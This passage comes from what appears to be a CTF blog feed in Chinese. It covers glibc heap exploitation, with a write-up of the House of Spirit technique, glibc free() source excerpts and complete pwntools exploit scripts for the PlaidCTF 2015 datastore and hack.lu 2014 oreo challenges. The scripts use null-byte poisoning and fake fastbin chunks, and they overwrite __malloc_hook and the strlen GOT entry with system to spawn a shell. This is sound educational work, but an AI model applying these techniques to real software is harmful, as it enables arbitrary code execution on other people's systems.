size:\n&quot;</span>)</span><br><span class="line">    io.sendline(str(size))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Enter data:\n&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> len(content) &lt; size:</span><br><span class="line">        content = content.ljust(size, <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">    io.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">key</span>):</span></span><br><span class="line">    cmd(<span class="string">&quot;DEL&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Enter row key:\n&quot;</span>)</span><br><span class="line">    io.sendline(key)</span><br><span class="line"></span><br><span class="line">delete(<span class="string">&quot;th3fl4g&quot;</span>)</span><br><span class="line"><span class="comment"># 分配足量0x38空闲块，避免影响后面分配连续的空间</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    put(str(i), <span class="number">0x38</span>, <span class="string">b&quot;padding&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    delete(str(i))</span><br><span class="line"></span><br><span class="line">put(<span class="string">&quot;1&quot;</span>, <span class="number">0x100</span>, <span class="string">b&quot;1&quot;</span>)</span><br><span class="line">put(<span class="string">&quot;2&quot;</span>, <span class="number">0xd0</span>, <span class="string">b&quot;2&quot;</span>)</span><br><span class="line">put(<span class="string">&quot;3&quot;</span>, <span class="number">0x60</span>, <span class="string">b&quot;3&quot;</span>)</span><br><span class="line">put(<span class="string">&quot;4&quot;</span>, <span class="number">0xf0</span>, <span class="string">b&quot;4&quot;</span>)</span><br><span class="line">put(<span class="string">&quot;5&quot;</span>, <span class="number">0xf0</span>, <span class="string">b&quot;5&quot;</span>)</span><br><span class="line">put(<span class="string">&quot;top&quot;</span>, <span class="number">0x400</span>, <span class="string">b&quot;padding to top&quot;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">delete(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">delete(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">delete(<span class="string">b&quot;a&quot;</span> * <span class="number">0xf0</span> + p64(<span class="number">0x360</span>))<span class="comment"># poison null byte</span></span><br><span class="line">delete(<span class="string">&quot;5&quot;</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(io, <span class="string">&quot;b *$rebase(0x1A20)&quot;</span>)</span><br><span class="line">put(<span class="string">&quot;0x330&quot;</span>, <span class="number">0x330</span>, <span class="string">b&quot;padding&quot;</span>)<span class="comment"># 前面的0x38块出现合并，分配出去，避免影响后续</span></span><br><span class="line">put(<span class="string">&quot;0x100&quot;</span>, <span class="number">0x100</span>, <span class="string">b&quot;padding&quot;</span>)</span><br><span class="line"></span><br><span class="line">libc_base = u64(get(<span class="string">&quot;2&quot;</span>)[:<span class="number">6</span>].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) - <span class="number">0x3ABC60</span></span><br><span class="line">log.info(<span class="string">&quot;libc_base: 0x%x&quot;</span> % libc_base)</span><br><span class="line">put(<span class="string">&quot;prepare&quot;</span>, <span class="number">0xf0</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">0xd8</span> + p64(<span class="number">0x71</span>) + p64(libc_base + libc.symbols[<span class="string">&quot;__malloc_hook&quot;</span>] - <span class="number">0x10</span> - <span class="number">3</span>))<span class="comment"># fastbin attack</span></span><br><span class="line"></span><br><span class="line">put(<span class="string">&quot;0x68&quot;</span>, <span class="number">0x68</span>, <span class="string">b&quot;padding&quot;</span>)</span><br><span class="line">put(<span class="string">&quot;attack&quot;</span>, <span class="number">0x68</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">3</span> + p64(libc_base + <span class="number">0x40dd6</span>))</span><br><span class="line">delete(<span class="string">&quot;a&quot;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>glibc2.23 <a href="https://github.com/clxsh/ctf_wps/blob/master/others/plaidctf%202015%20datastore/exp.py">exp</a></p><h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><ol><li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/off_by_one-zh/#2-plaidctf-2015-plaiddb">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/off_by_one-zh/#2-plaidctf-2015-plaiddb</a></li><li><a href="https://4ngelboy.blogspot.com/2016/10/span-display-block-overflow-hidden_10.html">https://4ngelboy.blogspot.com/2016/10/span-display-block-overflow-hidden_10.html</a></li></ol>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;Poison-null-byte&quot;&gt;&lt;a href=&quot;#Poison-null-byte&quot; class=&quot;headerlink&quot; title=&quot;Poison null byte&quot;&gt;&lt;/a&gt;Poison null byte&lt;/h2&gt;&lt;p&gt;关于堆块重叠，可以看这篇&lt;a href=&quot;https://4ngelboy.blogspot.com/2016/10/span-display-block-overflow-hidden_10.html&quot;&gt;文章&lt;/a&gt;，图文并茂。&lt;/p&gt;
&lt;p&gt;glibc2.26中，在unlink宏中加入了&lt;code&gt;size==prev_size(next_chunk)&lt;/code&gt;的检查，与下一chunk所存储的pre_size进行了比对，在&lt;code&gt;poison_null_byte.c&lt;/code&gt;中相应的添加了&lt;code&gt;*(size_t*)(b+0x1f0) = 0x200&lt;/code&gt;，可以绕过这个检查，所以how2heap的README中对glibc的要求是&lt;code&gt;&amp;lt;2.26&lt;/code&gt;应该是忘了改。&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;chunk b +------&amp;gt; +----------+&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                 |          |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                 +----------+ &amp;lt;---------+ size&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                 |  0X200   |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                 +----------+ &amp;lt;---------+ b&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                 |          |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                 |          |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                 |          |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                 |          |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                 |          |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                 |          |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                 |          |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                 |          |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                 |          |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                 +----------+  &amp;lt;--------+ fake pre_size&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                 |  0X200   |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                 +----------+&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                 |          |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;chunk c +------&amp;gt; +----------+  &amp;lt;--------+ pre_size&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                 |  0X210   |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                 +----------+&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                 |          |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                 |          |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                 |          |&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;strong&gt;触发unlink的流程&lt;/strong&gt;：通过null byte溢出伪造完0x200的chunk后，此时该chunk存在于unsortedbin。再次分配0x100的b1时，遍历unsortedbin，该chunk被放入到smallbin中，unsortedbin里的chunk也就这一个，遍历结束无法分配。又通过查找binmap找到0x200的smallbin，这时触发的unlink，将该chunk从smallbin中取出。&lt;/p&gt;</summary>
    
    
    
    
    <category term="CTF" scheme="http://hhdx.xyz/tags/CTF/"/>
    
    <category term="how2heap" scheme="http://hhdx.xyz/tags/how2heap/"/>
    
  </entry>
  
  <entry>
    <title>how2heap--House_of_Spirit Hack.lu2014--oreo</title>
    <link href="http://hhdx.xyz/2020/07/01/How2heap-house-of-spirit-hacklu2014-oreo/"/>
    <id>http://hhdx.xyz/2020/07/01/How2heap-house-of-spirit-hacklu2014-oreo/</id>
    <published>2020-07-01T06:13:34.000Z</published>
    <updated>2020-10-24T13:21:30.860Z</updated>
    
    <content type="html"><![CDATA[<h2 id="House-of-Spirit"><a href="#House-of-Spirit" class="headerlink" title="House of Spirit"></a>House of Spirit</h2><p>该攻击手法的主要是思想是，在不可控区域的前后伪造chunk信息，覆盖某指针指向<code>chunk2mem(fake_chunk)</code>，释放该指针后再次申请，对不可控区域的进行改写。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">+---------------+</span><br><span class="line">|   可 控 区 域   |</span><br><span class="line">+---------------+</span><br><span class="line">|               |</span><br><span class="line">| 不 可 控 区 域  |</span><br><span class="line">|               |</span><br><span class="line">| 一 般 为 某 些  |</span><br><span class="line">|  指 针         |</span><br><span class="line">+---------------+</span><br><span class="line">| 可 控 区 域     |</span><br><span class="line">+---------------+</span><br></pre></td></tr></table></figure><p>伪造的chunk也通常是fastbin，因为检查容易绕过。</p><a id="more"></a><p><code>__libc_free</code>函数中对<code>IS_MMAPED</code>检查。如果mmap分配，将会使用<code>munmap_chunk</code>进行释放。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// glibc release/2.25/master </span></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">__libc_free (<span class="keyword">void</span> *mem)</span><br><span class="line">&#123;</span><br><span class="line">    .....</span><br><span class="line">    p = mem2chunk (mem);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (chunk_is_mmapped (p))                       <span class="comment">/* release mmapped memory. */</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* See if the dynamic brk/mmap threshold needs adjusting.</span></span><br><span class="line"><span class="comment"> Dumped fake mmapped chunks do not affect the threshold.  */</span></span><br><span class="line">        <span class="keyword">if</span> (!mp_.no_dyn_threshold</span><br><span class="line">            &amp;&amp; chunksize_nomask (p) &gt; mp_.mmap_threshold</span><br><span class="line">            &amp;&amp; chunksize_nomask (p) &lt;= DEFAULT_MMAP_THRESHOLD_MAX</span><br><span class="line">        &amp;&amp; !DUMPED_MAIN_ARENA_CHUNK (p))</span><br><span class="line">        &#123;</span><br><span class="line">            mp_.mmap_threshold = chunksize (p);</span><br><span class="line">            mp_.trim_threshold = <span class="number">2</span> * mp_.mmap_threshold;</span><br><span class="line">            LIBC_PROBE (memory_mallopt_free_dyn_thresholds, <span class="number">2</span>,</span><br><span class="line">                        mp_.mmap_threshold, mp_.trim_threshold);</span><br><span class="line">        &#125;</span><br><span class="line">        munmap_chunk (p);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ar_ptr = arena_for_chunk (p);</span><br><span class="line">    _int_free (ar_ptr, p, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (__libc_free)</span><br></pre></td></tr></table></figure><p><code>_int_free</code>函数中对nextchunk的大小进行检查。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// glibc release/2.25/master 3909~3923</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (chunksize_nomask (chunk_at_offset (p, size))</span><br><span class="line">  &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">|| __builtin_expect (chunksize (chunk_at_offset (p, size))  </span><br><span class="line">     &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line"><span class="comment">/* We might not have a lock at this point and concurrent modifications</span></span><br><span class="line"><span class="comment">   of system_mem might have let to a false positive.  Redo the test</span></span><br><span class="line"><span class="comment">   after getting the lock.  */</span></span><br><span class="line"><span class="keyword">if</span> (have_lock</span><br><span class="line">    || (&#123; assert (locked == <span class="number">0</span>);</span><br><span class="line">  __libc_lock_lock (av-&gt;mutex);</span><br><span class="line">  locked = <span class="number">1</span>;  <span class="comment">// 对nextchunk大小进行检查</span></span><br><span class="line">  chunksize_nomask (chunk_at_offset (p, size)) &lt;= <span class="number">2</span> * SIZE_SZ</span><br><span class="line">    || chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem;</span><br><span class="line">      &#125;))</span><br></pre></td></tr></table></figure><h2 id="hack-lu2014-oreo"><a href="#hack-lu2014-oreo" class="headerlink" title="hack.lu2014 oreo"></a>hack.lu2014 oreo</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>题目比较古老了，防护开的不多。</p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>程序功能</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. Add new rifle</span><br><span class="line">2. Show added rifles</span><br><span class="line">3. Order selected rifles</span><br><span class="line">4. Leave a Message with your Order</span><br><span class="line">5. Show current stats</span><br><span class="line">6. Exit!</span><br></pre></td></tr></table></figure><p>Add new rifle 函数，固定分配0x38个字节，加上chunk头，也就是<strong>0x40的fast chunk size</strong>。在末尾四个字节处存储前一个rifle首地址。输入name和description，其中可以明显的看到溢出和覆盖。头指针和计数变量全局存储。</p><p>Show added rifles函数，对所有的rifle进行遍历，输出name和description。</p><p>Order selected rifles函数，订购rifles，遍历free 0x38字节的rifle结构。订单数也是一个全局变量。</p><p>Leave message函数，在全局存储128字节的信息。</p><p>所用到的全局变量的结构如下：</p><p><img src="https://raw.githubusercontent.com/clxsh/pics/master/img/image-20200701192427785.png" alt="image-20200701192427785"></p><p>rifle变量是rifle结构的头指针，order_num是订单数计数变量，num是rifle计数变量，message_ptr在main函数中初始化为&amp;message，指向下方128字节message空间的起始地址。</p><h3 id="leak-libc"><a href="#leak-libc" class="headerlink" title="leak libc"></a>leak libc</h3><p>通过对rifle的next指针覆盖成puts_got的地址，然后show added rifle就可以打印出puts的地址。</p><p>恰好puts_got+0x34的位置就是NULL，不会造成程序出错。</p><h3 id="house-of-spirit"><a href="#house-of-spirit" class="headerlink" title="house of spirit"></a>house of spirit</h3><p>message_ptr是一个理想的控制对象，只要控制了它存储的地址，就可以通过leave message进行改写。</p><p>查看附近，对齐地址就有0x804a2a0。不断进行add rifle就可以控制num，也就是<code>fakechunk-&gt;size</code>，后面message区域也可以进行nextchunk的构造。</p><p>添加0x40个rifle控制<code>fakechunk-&gt;size</code>为0x40。注意message前方align 20，所以message区域添加0x20的padding就完成了fakechunk的构造。接着构造nextchunk的pre_size和size，只要注意将size控制在<code>2 * SIZE_SZ</code>和<code>av-&gt;system_mem</code>中间的值即可。</p><p>在rifle中覆盖next指针为0x804a2a8，然后order rifle，fastbin的0x40链表头就有了我们伪造的chunk。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&quot;\x00&quot;</span>*<span class="number">0x20</span> + p32(<span class="number">0</span>) + p32(<span class="number">0x100</span>)</span><br><span class="line">leave_message(payload)</span><br><span class="line">add(<span class="string">b&quot;A&quot;</span>*<span class="number">27</span>+p32(<span class="number">0x804A2A8</span>), <span class="string">&quot;B&quot;</span>)</span><br><span class="line">order()</span><br></pre></td></tr></table></figure><p>接下来，利用message_ptr对strlen_got进行改写即可。</p><p><a href="https://github.com/clxsh/ctf_wps/blob/master/others/hacklu2014-oreo/exp.py">exp</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;i386&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">localfile = <span class="string">&quot;./oreo&quot;</span></span><br><span class="line">locallibc = <span class="string">&quot;/lib/i386-linux-gnu/libc.so.6&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">name, desc</span>):</span></span><br><span class="line">    <span class="comment"># io.recvuntil(&quot;: &quot;)</span></span><br><span class="line">    io.sendline(str(<span class="number">1</span>))</span><br><span class="line">    <span class="comment"># io.recvuntil(&quot;name: &quot;)</span></span><br><span class="line">    io.sendline(name)</span><br><span class="line">    <span class="comment"># io.recvuntil(&quot;description: &quot;)</span></span><br><span class="line">    io.sendline(desc)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">order</span>():</span></span><br><span class="line">    io.sendline(str(<span class="number">3</span>))</span><br><span class="line">    <span class="comment"># io.sendlineafter(&quot;Action: &quot;, str(3))</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leave_message</span>(<span class="params">msg</span>):</span></span><br><span class="line">    io.sendline(str(<span class="number">4</span>))</span><br><span class="line">    <span class="comment"># io.sendlineafter(&quot;Action: &quot;, str(4))</span></span><br><span class="line">    io.sendline(msg)</span><br><span class="line">    <span class="comment"># io.sendlineafter(&quot;your order: &quot;, msg)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;6. Exit!\n&quot;</span>)</span><br><span class="line">    <span class="comment"># leak libc</span></span><br><span class="line">    puts_got = <span class="number">0x804A248</span></span><br><span class="line">    payload = <span class="string">b&quot;A&quot;</span>*<span class="number">27</span> + p32(puts_got)</span><br><span class="line">    add(payload, <span class="string">&quot;B&quot;</span>)</span><br><span class="line">    gdb.attach(io, <span class="string">&quot;b *0x8048A25&quot;</span>)</span><br><span class="line">    io.sendline(str(<span class="number">2</span>))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Description: &quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Description: &quot;</span>)</span><br><span class="line">    puts_addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line">    libc_base = puts_addr - libc.sym[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">    log.debug(<span class="string">&quot;libc base: 0x%x&quot;</span> % libc_base)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># constructe fake chunk</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x3e</span>):</span><br><span class="line">        add(<span class="string">&quot;A&quot;</span>, <span class="string">&quot;B&quot;</span>)</span><br><span class="line">    add(<span class="string">b&quot;A&quot;</span>*<span class="number">27</span>+p32(<span class="number">0x804A2A8</span>), <span class="string">&quot;B&quot;</span>)</span><br><span class="line">    payload = <span class="string">b&quot;\x00&quot;</span>*<span class="number">0x20</span> + p32(<span class="number">0</span>) + p32(<span class="number">0x100</span>)</span><br><span class="line">    leave_message(payload)</span><br><span class="line">    order()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># attack</span></span><br><span class="line">    strlen_got = elf.got[<span class="string">&quot;strlen&quot;</span>]</span><br><span class="line">    add(<span class="string">&quot;A&quot;</span>, p32(strlen_got))</span><br><span class="line">    <span class="comment"># gdb.attach(io, &quot;b *0x8048A25&quot;)</span></span><br><span class="line">    system_addr = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">    leave_message(p32(system_addr) + <span class="string">b&quot;;/bin/sh&quot;</span>)</span><br><span class="line"></span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">argc = len(sys.argv)</span><br><span class="line"><span class="keyword">if</span> argc == <span class="number">1</span>:</span><br><span class="line">    io = process(localfile)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">if</span> argc == <span class="number">2</span>:</span><br><span class="line">        host, port = sys.argv[<span class="number">1</span>].split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> argc == <span class="number">3</span>:</span><br><span class="line">        host = sys.argv[<span class="number">1</span>]</span><br><span class="line">        port = sys.argv[<span class="number">2</span>]</span><br><span class="line">    io = remote(host, port)</span><br><span class="line">elf = ELF(localfile)</span><br><span class="line">libc = ELF(locallibc)</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure><h2 id="存在的疑问…"><a href="#存在的疑问…" class="headerlink" title="存在的疑问…"></a>存在的疑问…</h2><p>pwntools的recvuntil等函数无法正常使用，无论是最新开发版，还是稳定版本。</p><h2 id="ref"><a href="#ref" class="headerlink" title="ref"></a>ref</h2><ol><li>how2heap house_of_spirit.c</li><li><a href="https://www.anquanke.com/post/id/85357">https://www.anquanke.com/post/id/85357</a></li></ol>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;House-of-Spirit&quot;&gt;&lt;a href=&quot;#House-of-Spirit&quot; class=&quot;headerlink&quot; title=&quot;House of Spirit&quot;&gt;&lt;/a&gt;House of Spirit&lt;/h2&gt;&lt;p&gt;该攻击手法的主要是思想是，在不可控区域的前后伪造chunk信息，覆盖某指针指向&lt;code&gt;chunk2mem(fake_chunk)&lt;/code&gt;，释放该指针后再次申请，对不可控区域的进行改写。&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;+---------------+&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;|   可 控 区 域   |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;+---------------+&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;|               |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;| 不 可 控 区 域  |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;|               |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;| 一 般 为 某 些  |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;|  指 针         |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;+---------------+&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;| 可 控 区 域     |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;+---------------+&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

